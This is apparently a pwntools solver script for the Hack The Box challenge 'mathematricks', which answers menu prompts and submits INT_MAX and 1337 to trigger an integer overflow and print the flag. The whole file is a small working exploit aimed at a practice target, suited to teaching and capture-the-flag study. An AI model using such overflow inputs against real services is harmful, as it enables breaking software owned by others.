#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './mathematricks' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

sla = lambda x,y : r.sendlineafter(x,y)

sla('🥸 ', '1') # play game

# Questions
sla('> ', '2')
sla('> ', '1')
sla('> ', '0')
sla('n1: ', '2147483647') # INT_MAX
sla('n2: ', '1337')

print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')